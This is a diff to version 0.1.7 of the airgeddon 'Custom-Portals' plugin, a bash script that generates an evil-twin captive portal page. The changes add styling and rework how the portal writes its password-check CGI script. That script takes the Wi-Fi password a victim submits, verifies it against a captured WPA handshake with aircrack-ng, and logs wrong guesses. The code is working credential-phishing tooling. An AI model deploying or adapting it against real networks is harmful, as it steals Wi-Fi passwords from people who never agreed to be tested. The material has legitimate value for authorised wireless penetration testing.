@@ -2,7 +2,7 @@
 
 # Custom-Portals airgeddon plugin
 
-# Version:    0.1.6
+# Version:    0.1.7
 # Author:     KeyofBlueS
 # Repository: https://github.com/KeyofBlueS/airgeddon-plugins
 # License:    GNU General Public License v3.0, https://opensource.org/licenses/GPL-3.0
@@ -103,6 +103,11 @@ function custom_portals_override_set_captive_portal_page() {
 		echo -e "#showpass {"
 		echo -e "\tvertical-align: top;"
 		echo -e "}\n"
+		echo -e "@media screen (min-width: 1000px) {"
+		echo -e "\t.content {"
+		echo -e "\t\twidth: 50%;"
+		echo -e "\t}"
+		echo -e "}\n"
 		} >> "${tmpdir}${webdir}${cssfile}"
 	fi
 
@@ -180,36 +185,24 @@ function custom_portals_override_set_captive_portal_page() {
 		fi
 	fi
 
-	exec 4>"${tmpdir}${webdir}${checkfile}"
+	if [[ ! -f "${tmpdir}${webdir}${checkfile}" ]]; then
+		exec 4>"${tmpdir}${webdir}${checkfile}"
 
-	cat >&4 <<-EOF
-		#!/usr/bin/env bash
-		echo '<!DOCTYPE html>'
-		echo '<html>'
-		echo -e '\t<head>'
-		echo -e '\t\t<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>'
-		echo -e '\t\t<title>${et_misc_texts[${captive_portal_language},15]}</title>'
-		echo -e '\t\t<link rel="stylesheet" type="text/css" href="${cssfile}"/>'
-		echo -e '\t\t<script type="text/javascript" src="${jsfile}"></script>'
-		echo -e '\t</head>'
-		echo -e '\t<body>'
-		echo -e '\t\t<div class="content">'
-		echo -e '\t\t\t<center><p>'
-	EOF
-
-	if [[ "${custom_portals_full_password}" = "true" ]]; then
-		cat >&4 <<-'EOF'
-			POST_DATA=$(cat /dev/stdin)
-			if [[ "${REQUEST_METHOD}" = "POST" ]] && [[ ${CONTENT_LENGTH} -gt 0 ]]; then
-				POST_DATA=${POST_DATA#*=}
-				password=${POST_DATA/+/ }
-				password=${password//[]}
-				password=$(printf '%b' "${password//%/\\x}")
-				password=${password//[]}
-			fi
-			if [[ ${#password} -ge 8 ]] && [[ ${#password} -le 63 ]]; then
+		cat >&4 <<-EOF
+			#!/usr/bin/env bash
+			echo '<!DOCTYPE html>'
+			echo '<html>'
+			echo -e '\t<head>'
+			echo -e '\t\t<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>'
+			echo -e '\t\t<title>${et_misc_texts[${captive_portal_language},15]}</title>'
+			echo -e '\t\t<link rel="stylesheet" type="text/css" href="${cssfile}"/>'
+			echo -e '\t\t<script type="text/javascript" src="${jsfile}"></script>'
+			echo -e '\t</head>'
+			echo -e '\t<body>'
+			echo -e '\t\t<div class="content">'
+			echo -e '\t\t\t<center><p>'
 		EOF
-	else
+
 		cat >&4 <<-'EOF'
 			POST_DATA=$(cat /dev/stdin)
 			if [[ "${REQUEST_METHOD}" = "POST" ]] && [[ ${CONTENT_LENGTH} -gt 0 ]]; then
@@ -219,74 +212,86 @@ function custom_portals_override_set_captive_portal_page() {
 				password=$(printf '%b' "${password//%/\\x}")
 				password=${password//[*&\/?<>]}
 			fi
+
 			if [[ ${#password} -ge 8 ]] && [[ ${#password} -le 63 ]]; then
 		EOF
-	fi
 
-	cat >&4 <<-EOF
-			rm -rf "${tmpdir}${webdir}${currentpassfile}" > /dev/null 2>&1
-	EOF
+		cat >&4 <<-EOF
+				rm -rf "${tmpdir}${webdir}${currentpassfile}" > /dev/null 2>&1
+		EOF
 
-	cat >&4 <<-'EOF'
-			echo "${password}" >\
-	EOF
+		cat >&4 <<-'EOF'
+				echo "${password}" >\
+		EOF
 
-	cat >&4 <<-EOF
-			"${tmpdir}${webdir}${currentpassfile}"
-			aircrack-ng -a 2 -b ${bssid} -w "${tmpdir}${webdir}${currentpassfile}" "${et_handshake}" | grep "KEY FOUND!" > /dev/null
-	EOF
+		cat >&4 <<-EOF
+				"${tmpdir}${webdir}${currentpassfile}"
+				aircrack-ng -a 2 -b ${bssid} -w "${tmpdir}${webdir}${currentpassfile}" "${et_handshake}" | grep "KEY FOUND!" > /dev/null
+		EOF
 
-	cat >&4 <<-'EOF'
-			if [ "$?" = "0" ]; then
-	EOF
+		cat >&4 <<-'EOF'
+				if [ "$?" = "0" ]; then
+		EOF
 
-	cat >&4 <<-EOF
-				touch "${tmpdir}${webdir}${et_successfile}" > /dev/null 2>&1
-				echo '${et_misc_texts[${captive_portal_language},18]}'
-				et_successful=1
+		cat >&4 <<-EOF
+					touch "${tmpdir}${webdir}${et_successfile}" > /dev/null 2>&1
+					echo '${et_misc_texts[${captive_portal_language},18]}'
+					et_successful=1
+				else
+		EOF
+
+		cat >&4 <<-'EOF'
+					echo "${password}" >>\
+		EOF
+
+		cat >&4 <<-EOF
+					"${tmpdir}${webdir}${attemptsfile}"
+					echo '${et_misc_texts[${captive_portal_language},17]}'
+					et_successful=0
+				fi
+		EOF
+
+		cat >&4 <<-'EOF'
+			elif [[ ${#password} -gt 0 ]] && [[ ${#password} -lt 8 ]]; then
+		EOF
+
+		cat >&4 <<-EOF
+				echo '${et_misc_texts[${captive_portal_language},26]}'
+				et_successful=0
 			else
-	EOF
-
-	cat >&4 <<-'EOF'
-				echo "${password}" >>\
-	EOF
-
-	cat >&4 <<-EOF
-				"${tmpdir}${webdir}${attemptsfile}"
-				echo '${et_misc_texts[${captive_portal_language},17]}'
+				echo '${et_misc_texts[${captive_portal_language},14]}'
 				et_successful=0
 			fi
-	EOF
+			echo -e '\t\t\t</p></center>'
+			echo -e '\t\t</div>'
+			echo -e '\t</body>'
+			echo '</html>'
+		EOF
 
-	cat >&4 <<-'EOF'
-		elif [[ ${#password} -gt 0 ]] && [[ ${#password} -lt 8 ]]; then
-	EOF
+		cat >&4 <<-'EOF'
+			if [ ${et_successful} -eq 1 ]; then
+				exit 0
+			else
+				echo '<script type="text/javascript">'
+				echo -e '\tsetTimeout("redirect()", 3500);'
+				echo '</script>'
+				exit 1
+			fi
+		EOF
 
-	cat >&4 <<-EOF
-			echo '${et_misc_texts[${captive_portal_language},26]}'
-			et_successful=0
-		else
-			echo '${et_misc_texts[${captive_portal_language},14]}'
-			et_successful=0
+		exec 4>&-
+	fi
+
+	if [[ "${custom_portals_full_password}" = "true" ]]; then
+		if grep -Fq 'password=${password//[*&\/?<>]}' "${tmpdir}${webdir}${checkfile}"; then
+			lines_to_delete="$(grep -Fn 'password=${password//[*&\/?<>]}' "${tmpdir}${webdir}${checkfile}" | awk -F':' '{print $1}')"
+			for line_to_delete in ${lines_to_delete}; do
+				lines_to_delete_argument="${lines_to_delete_argument}${line_to_delete}d;"
+			done
+			sed -i "${lines_to_delete_argument}" "${tmpdir}${webdir}${checkfile}"
 		fi
-		echo -e '\t\t\t</p></center>'
-		echo -e '\t\t</div>'
-		echo -e '\t</body>'
-		echo '</html>'
-	EOF
+	fi
 
-	cat >&4 <<-'EOF'
-		if [ ${et_successful} -eq 1 ]; then
-			exit 0
-		else
-			echo '<script type="text/javascript">'
-			echo -e '\tsetTimeout("redirect()", 3500);'
-			echo '</script>'
-			exit 1
-		fi
-	EOF
-
-	exec 4>&-
 	sleep 3
 }
 
@@ -347,10 +352,11 @@ function custom_portals_prehook_set_captive_portal_language() {
 	done
 	if [[ "${selected_custom_portal}" -eq 1 ]]; then
 		copy_custom_portal=0
+		custom_portal='Standard'
 	else
 		copy_custom_portal=1
+		custom_portal="$(sed -n "${selected_custom_portal}"p "${tmpdir}ag.custom_portals.txt")"
 	fi
-	custom_portal="$(sed -n "${selected_custom_portal}"p "${tmpdir}ag.custom_portals.txt")"
 	rm "${tmpdir}ag.custom_portals.txt"
 	language_strings "${language}" "custom_portals_text_5" "yellow"
 	echo_yellow "${custom_portal}"
